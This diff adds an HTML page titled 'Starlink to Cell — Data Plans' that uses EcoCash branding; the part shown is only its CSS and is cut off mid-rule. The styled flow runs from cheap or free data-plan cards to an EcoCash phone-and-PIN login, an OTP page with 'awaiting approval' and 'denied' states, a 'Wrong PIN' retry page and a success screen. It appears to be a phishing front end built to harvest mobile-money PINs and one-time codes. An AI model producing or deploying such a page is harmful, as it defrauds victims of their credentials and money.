@@ -1,0 +1,2172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Starlink to Cell — Data Plans</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: #fff;
+  max-width: 480px;
+  margin: 0 auto;
+  min-height: 100vh;
+}
+
+/* ══ PAGE SYSTEM ══ */
+.page { display: none; min-height: 100vh; }
+.page.active { display: flex; flex-direction: column; }
+
+/* ════════════════════════════════════
+   PAGE 1 — PLANS
+════════════════════════════════════ */
+#page-plans {
+  background: #f0f4ff;
+  padding-bottom: 28px;
+  display: block;
+}
+
+/* ── Hero header ── */
+.plans-hero {
+  background: linear-gradient(160deg, #0a1628 0%, #0f2252 55%, #132d6a 100%);
+  padding: 22px 20px 24px;
+  position: relative;
+  overflow: hidden;
+}
+.plans-hero::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background-image:
+    radial-gradient(1.5px 1.5px at 18% 22%, rgba(255,255,255,0.55) 0%, transparent 100%),
+    radial-gradient(1px 1px at 72% 14%, rgba(255,255,255,0.4) 0%, transparent 100%),
+    radial-gradient(1px 1px at 40% 60%, rgba(255,255,255,0.3) 0%, transparent 100%),
+    radial-gradient(1.5px 1.5px at 85% 70%, rgba(255,255,255,0.45) 0%, transparent 100%),
+    radial-gradient(1px 1px at 55% 38%, rgba(255,255,255,0.35) 0%, transparent 100%),
+    radial-gradient(1px 1px at 12% 80%, rgba(255,255,255,0.3) 0%, transparent 100%),
+    radial-gradient(1.5px 1.5px at 93% 30%, rgba(255,255,255,0.5) 0%, transparent 100%),
+    radial-gradient(1px 1px at 28% 45%, rgba(255,255,255,0.25) 0%, transparent 100%);
+  pointer-events: none;
+}
+.hero-sat-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 10px;
+}
+.hero-sat-icon svg { width: 36px; height: 36px; opacity: 0.92; }
+.plans-title {
+  text-align: center;
+  font-size: 19px;
+  font-weight: 800;
+  color: #fff;
+  letter-spacing: -0.3px;
+  margin-bottom: 4px;
+  position: relative;
+}
+.plans-subtitle {
+  text-align: center;
+  font-size: 12.5px;
+  color: rgba(255,255,255,0.65);
+  letter-spacing: 0.3px;
+  position: relative;
+  margin-bottom: 14px;
+}
+.info-box {
+  background: rgba(255,255,255,0.12);
+  border: 1px solid rgba(255,255,255,0.18);
+  border-radius: 10px;
+  padding: 9px 14px;
+  font-size: 12px;
+  color: rgba(255,255,255,0.85);
+  line-height: 1.5;
+  text-align: center;
+  position: relative;
+  backdrop-filter: blur(4px);
+}
+.info-box strong { color: #fff; }
+
+/* ── Econet powered-by strip ── */
+.powered-by {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  font-size: 12px;
+  color: #94a3b8;
+  padding: 10px 16px 6px;
+}
+.econet-logo { display: flex; flex-direction: column; align-items: flex-start; line-height: 1; }
+.econet-top {
+  font-size: 18px; font-weight: 900;
+  font-family: Arial Black, sans-serif;
+  color: #1a237e; letter-spacing: 1px;
+  display: flex; align-items: center; gap: 2px;
+}
+.econet-arc { display: inline-block; width: 18px; height: 18px; }
+.econet-arc svg { width: 18px; height: 18px; }
+.econet-wireless { font-size: 9px; color: #1a237e; letter-spacing: 2px; margin-left: 2px; }
+
+/* ── Plan cards list ── */
+.plans-section-label {
+  font-size: 10.5px;
+  font-weight: 700;
+  letter-spacing: 1.2px;
+  text-transform: uppercase;
+  color: #94a3b8;
+  padding: 2px 14px 7px;
+}
+.plans-list { display: flex; flex-direction: column; gap: 9px; padding: 0 12px; }
+.plan-card {
+  border-radius: 16px; overflow: hidden; cursor: pointer;
+  position: relative; text-align: center;
+  padding: 16px 18px 14px; color: #fff;
+  display: flex; flex-direction: column;
+  align-items: center; gap: 2px;
+  transition: transform 0.18s, box-shadow 0.18s;
+  min-height: 110px; justify-content: center;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.14);
+}
+.plan-card:active { transform: scale(0.97); box-shadow: 0 2px 10px rgba(0,0,0,0.15); }
+
+/* Unique card styles — EcoCash palette ONLY */
+
+/* Card 1 — Free: crisp white with blue frame, red FREE price */
+.card-free {
+  background: #ffffff;
+  border: 2.5px solid #1565c0;
+  box-shadow: 0 8px 28px rgba(21,101,192,0.18);
+}
+.card-free .plan-data  { color: #0d47a1; }
+.card-free .plan-dur   { color: #1565c0; opacity: 0.7; }
+.card-free .plan-price { color: #e53935; }
+.card-free .view-details { color: #1565c0; opacity: 0.8; }
+.card-free .plan-badge {
+  background: #1565c0;
+  color: #fff;
+}
+
+/* Card 2 — $0.99: solid EcoCash Blue */
+.card-099 {
+  background: #1565c0;
+}
+
+/* Card 3 — $1.99: blue → dark blue gradient, red accent stripe */
+.card-199 {
+  background: linear-gradient(145deg, #1565c0 0%, #0d47a1 100%);
+  border-top: 3px solid #e53935;
+}
+
+/* Card 4 — $2.99: bold EcoCash Red */
+.card-299 {
+  background: linear-gradient(145deg, #e53935 0%, #c62828 100%);
+}
+
+/* Card 5 — $3.99: Blue + Red diagonal — full EcoCash identity */
+.card-399 {
+  background: linear-gradient(135deg, #0d47a1 0%, #1565c0 45%, #e53935 100%);
+}
+
+/* Glow/shimmer overlays */
+.card-free::after    { content:''; position:absolute; inset:0; background: radial-gradient(ellipse at 90% 10%, rgba(21,101,192,0.07) 0%, transparent 60%); pointer-events:none; border-radius:20px; }
+.card-099::after     { content:''; position:absolute; inset:0; background: radial-gradient(ellipse at 80% 15%, rgba(255,255,255,0.14) 0%, transparent 60%); pointer-events:none; }
+.card-199::after     { content:''; position:absolute; inset:0; background: radial-gradient(ellipse at 80% 15%, rgba(255,255,255,0.12) 0%, transparent 60%); pointer-events:none; }
+.card-299::after     { content:''; position:absolute; inset:0; background: radial-gradient(ellipse at 80% 15%, rgba(255,255,255,0.16) 0%, transparent 60%); pointer-events:none; }
+.card-399::after     { content:''; position:absolute; inset:0; background: radial-gradient(ellipse at 70% 10%, rgba(255,255,255,0.15) 0%, transparent 55%); pointer-events:none; }
+
+.sat-svg {
+  position: absolute; inset: 0; width: 100%; height: 100%;
+  opacity: 0.1; pointer-events: none;
+}
+.card-free .sat-svg { opacity: 0.06; filter: invert(24%) sepia(85%) saturate(1200%) hue-rotate(201deg); }
+.plan-badge {
+  position: absolute; top: 10px; left: 10px;
+  background: rgba(255,255,255,0.22); border-radius: 20px;
+  padding: 3px 9px; font-size: 10px; font-weight: 600; color: #fff;
+  backdrop-filter: blur(4px);
+}
+/* "Most popular" ribbon on $3.99 — EcoCash red */
+.badge-popular {
+  background: #e53935;
+  color: #fff !important;
+  font-weight: 700 !important;
+  box-shadow: 0 2px 8px rgba(229,57,53,0.5);
+}
+.plan-data  { font-size: 21px; font-weight: 800; letter-spacing: -0.5px; position: relative; }
+.plan-dur   { font-size: 12px; color: rgba(255,255,255,0.72); position: relative; }
+.plan-price { font-size: 24px; font-weight: 800; margin-top: 2px; position: relative; letter-spacing: -0.5px; }
+.plan-price-free { font-size: 20px; font-weight: 800; color: #e53935; letter-spacing: -0.5px; }
+.view-details {
+  font-size: 11.5px; font-weight: 600;
+  color: rgba(255,255,255,0.85); margin-top: 4px; position: relative;
+  display: flex; align-items: center; gap: 4px;
+}
+.card-free .view-details { color: #1565c0; opacity: 0.8; }
+.view-details::after { content: '→'; }
+
+/* ════════════════════════════════════
+   MODAL OVERLAY — PLAN DETAILS
+════════════════════════════════════ */
+/* ════════════════════════════════════
+   MODAL — EcoCash palette only
+   #1565c0 · #0d47a1 · #e53935 · #f0f4ff · #fff
+════════════════════════════════════ */
+.modal-overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(13,71,161,0.45); z-index: 200;
+  align-items: center; justify-content: center; padding: 20px;
+  backdrop-filter: blur(3px);
+}
+.modal-overlay.open { display: flex; }
+
+.modal-box {
+  background: #fff;
+  border-radius: 18px;
+  width: 100%; max-width: 350px; overflow: hidden;
+  box-shadow: 0 20px 48px rgba(13,71,161,0.22), 0 4px 14px rgba(13,71,161,0.1);
+  animation: popUp 0.26s cubic-bezier(0.34,1.56,0.64,1);
+}
+@keyframes popUp {
+  from { transform: scale(0.88) translateY(24px); opacity: 0; }
+  to   { transform: scale(1) translateY(0);       opacity: 1; }
+}
+
+/* Header — EcoCash Blue with red bottom accent */
+.modal-header {
+  background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
+  border-bottom: 2px solid #e53935;
+  padding: 16px 16px 14px;
+  display: flex; align-items: flex-start; justify-content: space-between; gap: 10px;
+}
+.modal-header-left { display: flex; align-items: center; gap: 11px; }
+.modal-emoji {
+  font-size: 26px; line-height: 1;
+  background: rgba(255,255,255,0.15);
+  border-radius: 10px; padding: 6px 8px;
+  display: flex; align-items: center; justify-content: center;
+}
+.modal-title { font-size: 16px; font-weight: 800; color: #fff; line-height: 1.25; letter-spacing: -0.2px; }
+.modal-close-btn {
+  background: rgba(255,255,255,0.15); border: none;
+  color: #fff; font-size: 17px; cursor: pointer;
+  padding: 0; line-height: 1; flex-shrink: 0;
+  width: 28px; height: 28px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  transition: background 0.15s;
+}
+.modal-close-btn:hover { background: rgba(255,255,255,0.25); }
+
+/* Body — white with dark blue text */
+.modal-body {
+  padding: 15px 16px 4px;
+  color: #1a1a1a;
+  font-size: 13px; line-height: 1.6;
+  background: #fff;
+}
+.modal-body p { margin-bottom: 8px; }
+.modal-body strong { color: #0d47a1; font-weight: 700; }
+
+/* Price value pops in EcoCash red */
+#m-price { color: #e53935; font-weight: 800; font-size: 14px; }
+
+/* Bullet list — blue markers */
+.modal-bullets {
+  list-style: none;
+  padding-left: 0;
+  margin: 4px 0 8px;
+}
+.modal-bullets li {
+  margin-bottom: 6px; font-size: 12.5px;
+  color: #1a1a1a; line-height: 1.45;
+  display: flex; align-items: flex-start; gap: 8px;
+}
+.modal-bullets li::before {
+  content: '';
+  flex-shrink: 0;
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: #1565c0;
+  margin-top: 4px;
+}
+
+/* Note box — light blue tint strip */
+.modal-note {
+  font-size: 12px; line-height: 1.5;
+  margin-top: 8px;
+  background: #f0f4ff;
+  border-left: 3px solid #1565c0;
+  border-radius: 0 7px 7px 0;
+  padding: 8px 12px;
+  color: #0d47a1;
+}
+
+/* Footer */
+.modal-footer {
+  display: flex; gap: 10px;
+  padding: 12px 16px 16px;
+  background: #fff;
+  border-top: 1px solid #f0f4ff;
+}
+.btn-cancel-modal {
+  flex: 1;
+  background: #f0f4ff;
+  border: 1.5px solid #1565c0;
+  border-radius: 12px;
+  padding: 12px; font-size: 13.5px; font-weight: 600;
+  color: #1565c0; cursor: pointer; font-family: inherit;
+  transition: background 0.15s;
+}
+.btn-cancel-modal:active { background: #e3ecfa; }
+
+.btn-action-modal {
+  flex: 2;
+  background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+  border: none; border-radius: 12px;
+  padding: 12px; font-size: 13.5px; font-weight: 700;
+  color: #fff; cursor: pointer; font-family: inherit;
+  box-shadow: 0 4px 14px rgba(21,101,192,0.35);
+  transition: transform 0.15s, box-shadow 0.15s;
+}
+.btn-action-modal:active {
+  transform: scale(0.97);
+  box-shadow: 0 2px 8px rgba(21,101,192,0.25);
+}
+
+/* ════════════════════════════════════
+   PAGE 2 — ECOCASH LOGIN
+════════════════════════════════════ */
+#page-login {
+  background: #f5f7fc;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 20px 16px;
+}
+.login-card-wrap {
+  width: 100%;
+  max-width: 390px;
+  border-radius: 24px;
+  overflow: hidden;
+  box-shadow: 0 16px 48px rgba(21,101,192,0.14), 0 4px 16px rgba(0,0,0,0.06);
+}
+.login-top {
+  display: flex; flex-direction: column;
+  align-items: center;
+  padding: 32px 28px 24px;
+  width: 100%;
+  background: #fff;
+}
+.ecocash-brand { font-size: 32px; font-weight: 800; letter-spacing: -1px; margin-bottom: 4px; }
+.eco  { color: #1565c0; }
+.cash { color: #e53935; }
+.login-label { font-size: 17px; font-weight: 400; color: #64748b; margin-bottom: 22px; }
+
+/* Phone input - Zimbabwe EcoCash design */
+.phone-field-group {
+  width: 100%;
+  margin-bottom: 10px;
+}
+.phone-field-label {
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  color: #64748b;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+  padding-left: 4px;
+}
+.phone-input-wrap {
+  width: 100%;
+  border: 2px solid #d1d9e6;
+  border-radius: 14px;
+  display: flex;
+  align-items: stretch;
+  overflow: hidden;
+  background: #fff;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.phone-input-wrap:focus-within {
+  border-color: #1565c0;
+  box-shadow: 0 0 0 3px rgba(21,101,192,0.10);
+}
+.phone-input-wrap.error {
+  border-color: #e53935;
+  box-shadow: 0 0 0 3px rgba(229,57,53,0.10);
+}
+.phone-country-pill {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 11px 12px 11px 14px;
+  background: #f0f4ff;
+  border-right: 1.5px solid #d1d9e6;
+  flex-shrink: 0;
+  cursor: default;
+  user-select: none;
+}
+.phone-flag { font-size: 17px; line-height: 1; }
+.phone-code {
+  font-size: 13.5px;
+  font-weight: 700;
+  color: #0d47a1;
+  letter-spacing: 0.3px;
+}
+.phone-chevron {
+  color: #94a3b8;
+  font-size: 10px;
+  margin-left: 2px;
+}
+.phone-num-input {
+  flex: 1;
+  border: none;
+  outline: none;
+  background: transparent;
+  font-size: 15px;
+  font-weight: 600;
+  color: #111;
+  font-family: inherit;
+  caret-color: #1565c0;
+  min-width: 0;
+  padding: 11px 14px;
+  letter-spacing: 1px;
+}
+.phone-num-input::placeholder {
+  color: #c0cadb;
+  font-weight: 400;
+  letter-spacing: 0;
+}
+
+/* Phone error message */
+.phone-error-msg {
+  display: none;
+  margin-top: 8px;
+  padding: 9px 14px;
+  background: #fff5f5;
+  border: 1px solid #fecaca;
+  border-radius: 10px;
+  font-size: 13px;
+  color: #dc2626;
+  font-weight: 500;
+  animation: shakeIn 0.35s ease;
+}
+.phone-error-msg.visible { display: block; }
+@keyframes shakeIn {
+  0%,100% { transform: translateX(0); }
+  20%      { transform: translateX(-6px); }
+  40%      { transform: translateX(6px); }
+  60%      { transform: translateX(-4px); }
+  80%      { transform: translateX(4px); }
+}
+
+
+.pin-heading { font-size: 13px; color: #888; margin-bottom: 12px; text-align: center; }
+.pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; }
+.pin-box {
+  width: 50px; height: 50px; border: 2px solid #1565c0; border-radius: 12px;
+  text-align: center; font-size: 20px; font-weight: 700; color: #111;
+  outline: none; background: #fff; caret-color: #1565c0;
+}
+.pin-box:focus { background: #f0f4ff; border-color: #0d47a1; }
+.forgot-pin { font-size: 12.5px; color: #aaa; text-align: center; }
+.login-bottom {
+  background: #1565c0;
+  padding: 26px 24px 32px;
+  text-align: center;
+  width: 100%;
+}
+.bottom-text { color: rgba(255,255,255,0.92); font-size: 13px; line-height: 1.55; margin-bottom: 14px; }
+.bottom-btns { display: flex; gap: 10px; justify-content: center; margin-bottom: 14px; }
+.btn-white {
+  flex: 1; background: #fff; border: none; border-radius: 50px;
+  padding: 11px 10px; font-size: 13px; font-weight: 700;
+  color: #1565c0; cursor: pointer; font-family: inherit;
+}
+.bottom-version { font-size: 11px; color: rgba(255,255,255,0.55); margin-bottom: 5px; }
+.bottom-terms   { font-size: 11px; color: rgba(255,255,255,0.55); }
+.bottom-terms a { color: rgba(255,255,255,0.85); }
+
+/* ════════════════════════════════════
+   PAGE 3 — OTP VERIFICATION
+══════════════════════════════════ */
+#page-otp { background: #f0f0f0; padding: 18px 16px 30px; }
+.back-btn {
+  width: 36px; height: 36px; border-radius: 50%;
+  border: 1.5px solid #ccc; background: #fff;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; font-size: 18px; color: #444; margin-bottom: 14px;
+}
+.otp-card { background: #fff; border-radius: 18px; padding: 22px 20px 22px; }
+.otp-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 7px; }
+.otp-desc  { font-size: 12.5px; color: #888; line-height: 1.55; margin-bottom: 12px; }
+.otp-phone { font-size: 13.5px; font-weight: 700; color: #111; margin-bottom: 16px; }
+.otp-field-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.6px; color: #aaa; margin-bottom: 8px; }
+.otp-boxes {
+  display: flex; gap: 7px; margin-bottom: 12px;
+  justify-content: center;
+}
+.otp-box {
+  width: 42px; height: 46px; flex: none;
+  border: 2px solid #1565c0; border-radius: 10px;
+  text-align: center; font-size: 18px; font-weight: 700; color: #111;
+  outline: none; background: #fff; caret-color: #1565c0;
+}
+.otp-box:focus { background: #f0f4ff; border-color: #0d47a1; }
+.otp-resend { font-size: 12px; color: #aaa; text-align: center; margin-bottom: 16px; }
+.btn-submit {
+  width: 100%; background: #c8c8c8; border: none; border-radius: 12px;
+  padding: 14px; font-size: 15px; font-weight: 600;
+  color: #fff; cursor: pointer; font-family: inherit; transition: background 0.2s;
+}
+.btn-submit.ready { background: #1565c0; }
+
+/* OTP Approval Loading State */
+.otp-approval-status {
+  display: none;
+  text-align: center;
+  padding: 20px 0;
+}
+.otp-approval-status.visible {
+  display: block;
+  animation: fadeIn 0.3s ease;
+}
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+.otp-spinner {
+  width: 40px;
+  height: 40px;
+  border: 3px solid #e2e8f0;
+  border-top-color: #1565c0;
+  border-radius: 50%;
+  margin: 0 auto 12px;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.otp-approval-text {
+  font-size: 14px;
+  color: #64748b;
+  margin-bottom: 6px;
+}
+.otp-approval-sub {
+  font-size: 12px;
+  color: #94a3b8;
+}
+.otp-denied-msg {
+  display: none;
+  background: #fef2f2;
+  border: 1px solid #fecaca;
+  border-radius: 12px;
+  padding: 14px 18px;
+  margin-bottom: 16px;
+  text-align: center;
+}
+.otp-denied-msg.visible {
+  display: block;
+  animation: shake 0.4s ease;
+}
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25% { transform: translateX(-6px); }
+  75% { transform: translateX(6px); }
+}
+.otp-denied-text {
+  font-size: 14px;
+  color: #dc2626;
+  font-weight: 600;
+}
+.otp-denied-sub {
+  font-size: 12px;
+  color: #ef4444;
+  margin-top: 4px;
+}
+
+/* ══════════════════════════════════════
+   ECOCASH CONNECTING OVERLAY (3 sec)
+══════════════════════════════════════ */
+#ecocash-connect-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: linear-gradient(160deg, #0a1628 0%, #0d1f55 55%, #081240 100%);
+  z-index: 9999;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 0;
+}
+#ecocash-connect-overlay.active { display: flex; }
+
+/* Stars layer */
+#ecocash-connect-overlay::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background-image:
+    radial-gradient(1.5px 1.5px at 12% 18%, rgba(255,255,255,0.6) 0%, transparent 100%),
+    radial-gradient(1px 1px at 68% 10%, rgba(255,255,255,0.45) 0%, transparent 100%),
+    radial-gradient(1px 1px at 38% 65%, rgba(255,255,255,0.35) 0%, transparent 100%),
+    radial-gradient(1.5px 1.5px at 82% 72%, rgba(255,255,255,0.55) 0%, transparent 100%),
+    radial-gradient(1px 1px at 55% 32%, rgba(255,255,255,0.4) 0%, transparent 100%),
+    radial-gradient(1px 1px at 22% 82%, rgba(255,255,255,0.3) 0%, transparent 100%),
+    radial-gradient(1.5px 1.5px at 90% 25%, rgba(255,255,255,0.5) 0%, transparent 100%),
+    radial-gradient(1px 1px at 48% 50%, rgba(255,255,255,0.28) 0%, transparent 100%);
+  pointer-events: none;
+}
+
+/* Signal-ring animation */
+.eco-signal-rings {
+  position: relative;
+  width: 148px; height: 148px;
+  display: flex; align-items: center; justify-content: center;
+  margin-bottom: 36px;
+}
+.eco-signal-ring {
+  position: absolute;
+  border-radius: 50%;
+  border: 2px solid rgba(59,130,246,0.55);
+  animation: ecoRingPulse 2s ease-out infinite;
+}
+.eco-signal-ring:nth-child(1) { width: 148px; height: 148px; animation-delay: 0s; }
+.eco-signal-ring:nth-child(2) { width: 108px; height: 108px; animation-delay: 0.45s; }
+.eco-signal-ring:nth-child(3) { width: 72px;  height: 72px;  animation-delay: 0.9s; }
+@keyframes ecoRingPulse {
+  0%   { transform: scale(0.8); opacity: 0; }
+  40%  { opacity: 1; }
+  100% { transform: scale(1.2); opacity: 0; }
+}
+.eco-signal-core {
+  width: 66px; height: 66px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 32px rgba(21,101,192,0.75), 0 0 10px rgba(21,101,192,0.5);
+  z-index: 1;
+  animation: ecoCoreGlow 2s ease-in-out infinite alternate;
+}
+@keyframes ecoCoreGlow {
+  from { box-shadow: 0 0 24px rgba(21,101,192,0.65), 0 0 8px rgba(21,101,192,0.4); }
+  to   { box-shadow: 0 0 42px rgba(21,101,192,0.92), 0 0 16px rgba(21,101,192,0.7); }
+}
+.eco-signal-core svg { width: 30px; height: 30px; fill: #fff; }
+
+.eco-connect-brand {
+  font-size: 44px; font-weight: 800; letter-spacing: -1.5px;
+  margin-bottom: 12px;
+}
+.eco-connect-brand .eco  { color: #3b82f6; }
+.eco-connect-brand .cash { color: #e53935; }
+
+.eco-connect-title {
+  font-size: 18px; font-weight: 600;
+  color: #fff;
+  margin-bottom: 8px;
+  letter-spacing: 0.2px;
+}
+.eco-connect-dots::after {
+  content: '';
+  animation: dotsCycle 1.2s steps(4, end) infinite;
+}
+@keyframes dotsCycle {
+  0%   { content: ''; }
+  25%  { content: '.'; }
+  50%  { content: '..'; }
+  75%  { content: '...'; }
+  100% { content: ''; }
+}
+.eco-connect-sub {
+  font-size: 13px;
+  color: rgba(255,255,255,0.5);
+  margin-bottom: 48px;
+  display: flex; align-items: center; gap: 6px;
+}
+.eco-connect-sub svg { width: 14px; height: 14px; }
+
+/* Progress bar */
+.eco-progress-wrap {
+  position: absolute;
+  bottom: 0; left: 0; right: 0;
+  height: 3px;
+  background: rgba(255,255,255,0.08);
+}
+.eco-progress-bar {
+  height: 100%;
+  background: linear-gradient(90deg, #1565c0, #3b82f6, #60a5fa);
+  width: 0%;
+  transition: width 3s linear;
+  border-radius: 0 2px 2px 0;
+}
+#ecocash-connect-overlay.active .eco-progress-bar {
+  width: 100%;
+}
+
+/* Shield badge */
+.eco-secure-badge {
+  display: flex; align-items: center; gap: 8px;
+  background: rgba(255,255,255,0.09);
+  border: 1px solid rgba(255,255,255,0.18);
+  border-radius: 22px;
+  padding: 9px 20px;
+  font-size: 13px;
+  color: rgba(255,255,255,0.75);
+  letter-spacing: 0.1px;
+}
+.eco-secure-badge svg { width: 15px; height: 15px; }
+
+/* ── Full-screen loading overlay ── */
+#loading-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: linear-gradient(160deg, #f8faff 0%, #eef2ff 100%);
+  z-index: 999;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 18px;
+}
+#loading-overlay.active {
+  display: flex;
+}
+.loading-logo {
+  font-size: 44px;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 4px;
+}
+.loading-spinner {
+  width: 54px;
+  height: 54px;
+  border: 4px solid #dbe8ff;
+  border-top-color: #1565c0;
+  border-radius: 50%;
+  animation: spin 0.75s linear infinite;
+}
+.loading-text {
+  font-size: 17px;
+  color: #1e293b;
+  font-weight: 600;
+  letter-spacing: -0.2px;
+}
+.loading-sub {
+  font-size: 13px;
+  color: #94a3b8;
+  margin-top: -10px;
+  font-weight: 400;
+}
+/* Loading overlay — authentication status badge */
+.loading-approval-badge {
+  display: flex;
+  align-items: center;
+  gap: 9px;
+  background: #fff;
+  border: 1.5px solid #1565c0;
+  border-radius: 50px;
+  padding: 11px 24px;
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #1565c0;
+  margin-top: 4px;
+  letter-spacing: 0.1px;
+  box-shadow: 0 4px 16px rgba(21,101,192,0.12);
+}
+.loading-approval-dot {
+  width: 8px; height: 8px;
+  background: #1565c0;
+  border-radius: 50%;
+  flex-shrink: 0;
+  animation: loadingBlink 1.2s ease-in-out infinite;
+}
+@keyframes loadingBlink {
+  0%,100% { opacity: 1; transform: scale(1); }
+  50%      { opacity: 0.25; transform: scale(0.65); }
+}
+
+/* ── Wrong PIN page ── */
+#page-wrong-pin {
+  background: linear-gradient(180deg, #fff5f5 0%, #fee2e2 100%);
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+.wrong-pin-card {
+  background: #fff;
+  border-radius: 24px;
+  padding: 48px 32px 40px;
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.08);
+  animation: successSlideUp 0.45s ease;
+}
+.wrong-pin-ring {
+  width: 88px;
+  height: 88px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 28px;
+  box-shadow: 0 8px 24px rgba(239,68,68,0.28);
+  animation: successPulse 0.55s ease 0.15s both;
+}
+.wrong-pin-ring svg {
+  width: 42px;
+  height: 42px;
+  stroke: #fff;
+  stroke-width: 2.8;
+  fill: none;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+}
+.wrong-pin-title {
+  font-size: 24px;
+  font-weight: 800;
+  color: #1a1a2e;
+  margin-bottom: 10px;
+  letter-spacing: -0.3px;
+}
+.wrong-pin-subtitle {
+  font-size: 14.5px;
+  color: #64748b;
+  line-height: 1.65;
+  margin-bottom: 28px;
+  max-width: 270px;
+  margin-left: auto;
+  margin-right: auto;
+}
+.wrong-pin-redirect {
+  font-size: 13px;
+  color: #94a3b8;
+  margin-top: 20px;
+}
+.wrong-pin-redirect span {
+  color: #1565c0;
+  font-weight: 600;
+}
+/* Wrong details page — btn to try again */
+.wrong-pin-btn {
+  width: 100%;
+  background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+  border: none;
+  border-radius: 14px;
+  padding: 15px;
+  font-size: 15px;
+  font-weight: 700;
+  color: #fff;
+  cursor: pointer;
+  font-family: inherit;
+  margin-top: 4px;
+  box-shadow: 0 4px 16px rgba(21,101,192,0.25);
+  transition: transform 0.15s;
+}
+.wrong-pin-btn:active { transform: scale(0.97); }
+
+/* ════════════════════════════════════
+   PAGE 4 — SUCCESS
+════════════════════════════════════ */
+#page-success {
+  background: linear-gradient(180deg, #f8fafc 0%, #e2e8f0 100%);
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+.success-card {
+  background: #fff;
+  border-radius: 24px;
+  padding: 48px 32px 36px;
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.08);
+  animation: successSlideUp 0.5s ease;
+}
+@keyframes successSlideUp {
+  from { transform: translateY(30px); opacity: 0; }
+  to   { transform: translateY(0); opacity: 1; }
+}
+.success-ring {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 28px;
+  box-shadow: 0 8px 24px rgba(34,197,94,0.25);
+  animation: successPulse 0.6s ease 0.3s both;
+}
+@keyframes successPulse {
+  0%   { transform: scale(0.5); opacity: 0; }
+  60%  { transform: scale(1.1); }
+  100% { transform: scale(1); opacity: 1; }
+}
+.success-ring svg {
+  width: 48px;
+  height: 48px;
+  stroke: #fff;
+  stroke-width: 3;
+  fill: none;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  stroke-dasharray: 40;
+  stroke-dashoffset: 40;
+  animation: drawCheck 0.4s ease 0.8s forwards;
+}
+@keyframes drawCheck {
+  to { stroke-dashoffset: 0; }
+}
+.success-title {
+  font-size: 26px;
+  font-weight: 800;
+  color: #1a1a2e;
+  margin-bottom: 12px;
+  letter-spacing: -0.3px;
+}
+.success-subtitle {
+  font-size: 15px;
+  color: #64748b;
+  line-height: 1.6;
+  margin-bottom: 32px;
+  max-width: 280px;
+  margin-left: auto;
+  margin-right: auto;
+}
+.success-details {
+  background: #f1f5f9;
+  border-radius: 16px;
+  padding: 20px 24px;
+  margin-bottom: 28px;
+  text-align: left;
+}
+.success-detail-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 8px 0;
+  border-bottom: 1px solid #e2e8f0;
+}
+.success-detail-row:last-child {
+  border-bottom: none;
+}
+.success-detail-label {
+  font-size: 13px;
+  color: #94a3b8;
+  font-weight: 500;
+}
+.success-detail-value {
+  font-size: 14px;
+  color: #1e293b;
+  font-weight: 600;
+}
+.success-status {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: #dcfce7;
+  color: #16a34a;
+  font-size: 12px;
+  font-weight: 700;
+  padding: 5px 12px;
+  border-radius: 20px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.success-status-dot {
+  width: 6px;
+  height: 6px;
+  background: #22c55e;
+  border-radius: 50%;
+}
+.btn-success-back {
+  width: 100%;
+  background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+  color: #fff;
+  border: none;
+  border-radius: 16px;
+  padding: 16px 24px;
+  font-size: 16px;
